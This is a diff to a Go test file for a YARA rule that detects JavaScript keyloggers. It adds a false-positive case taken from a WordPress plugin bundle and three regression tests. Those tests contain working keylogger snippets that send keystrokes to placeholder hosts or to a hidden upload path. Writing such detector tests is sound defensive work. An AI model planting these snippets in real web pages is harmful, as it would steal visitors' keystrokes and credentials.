@@ -73,3 +73,50 @@ func TestFPKeylogger_CredentialFieldExfilStillDetected(t *testing.T) {
 		t.Error("exfil_keylogger_js regression: credential-field exfil not detected")
 	}
 }
+
+// smushBundleShape is excerpted verbatim from WP Smush's minified
+// smush-tutorials.min.js, the 2026-08-07 false positive: an accessibility
+// Enter-key handler COMPARES the key code to a constant
+// ((e.which||e.keyCode)===ct.KeyCode.RETURN) ~265 chars before an unrelated
+// media fetch, and a React onKeyDown prop elsewhere supplies the key-handler
+// token. A comparison never stores the keystroke, so it must not pair with a
+// nearby network call the way a capture (+=, push, fromCharCode concat) does.
+const smushBundleShape = `-href"),"_blank")})),Ge(Je(t),"handleKeydown",(function(e){if((e.which||e.keyCode)===ct.KeyCode.RETURN)t.openLink(e)})),t.state={media:[],error:null,isLoaded:!1},t.openLink=t.openLink.bind(Je(t)),t.handleKeydown=t.handleKeydown.bind(Je(t)),t}return n=i,(r=[{key:"componentDidMount",value:function(){var e=this,t=this.props.media;fetch("https://wpmudev.com/blog/wp-json/wp/v2/media/"+t).then((function(e){return e.json()})).then((function(t){e.setState({isLoaded:!0,media:t.guid.rendered})}),(function(t){e.setState({isLoaded:!0,error:t})}))}},{key:"render",value:function(){var t=this.state,n=t.media,r=t.error,a=t.isLoaded` +
+	`,translate:[{read_article:u,min_read:s}],onClick:function(e){return t.openLink(e)},onKeyDown:function(e){return t.handleKeydown(e)}}))}));return a?e.createElement(Ke,{type:"error"`
+
+func TestFPKeylogger_SmushTutorialsBundle(t *testing.T) {
+	s := loadRepoYaraScanner(t)
+	if hasYaraRule(s.ScanBytes([]byte(smushBundleShape)), "exfil_keylogger_js") {
+		t.Error("exfil_keylogger_js FP: matched Smush bundle (Enter-key comparison + unrelated media fetch)")
+	}
+}
+
+// Keystrokes pushed into an array, then beaconed to a same-origin collector.
+func TestFPKeylogger_PushedKeystrokeBufferStillDetected(t *testing.T) {
+	s := loadRepoYaraScanner(t)
+	mal := []byte(`var q=[];window.addEventListener("keyup",function(e){q.push(e.key);` +
+		`if(q.length>=32){navigator.sendBeacon("/wp-content/uploads/.cache/l.php",q.join(""));q=[]}});`)
+	if !hasYaraRule(s.ScanBytes(mal), "exfil_keylogger_js") {
+		t.Error("exfil_keylogger_js regression: pushed keystroke buffer not detected")
+	}
+}
+
+// The keystroke interpolated straight into the exfil URL via a template literal.
+func TestFPKeylogger_TemplateLiteralKeystrokeStillDetected(t *testing.T) {
+	s := loadRepoYaraScanner(t)
+	mal := []byte("addEventListener(\"keydown\",e=>{fetch(`https://t.example.invalid/k?v=${e.key}&u=${location.href}`,{mode:\"no-cors\"})});")
+	if !hasYaraRule(s.ScanBytes(mal), "exfil_keylogger_js") {
+		t.Error("exfil_keylogger_js regression: template-literal keystroke exfil not detected")
+	}
+}
+
+// Send routine defined before the capture: the sink sits earlier in the file
+// than the keystroke accumulation, so the either-order window must still pair.
+func TestFPKeylogger_SinkBeforeCaptureStillDetected(t *testing.T) {
+	s := loadRepoYaraScanner(t)
+	mal := []byte(`function ship(d){var x=new XMLHttpRequest;x.open("POST","//log.example.invalid/i");x.send(d)}` +
+		`var log="";document.onkeydown=function(e){log+=String.fromCharCode(e.keyCode);if(log.length>64){ship(log);log=""}};`)
+	if !hasYaraRule(s.ScanBytes(mal), "exfil_keylogger_js") {
+		t.Error("exfil_keylogger_js regression: sink-before-capture buffered keylogger not detected")
+	}
+}
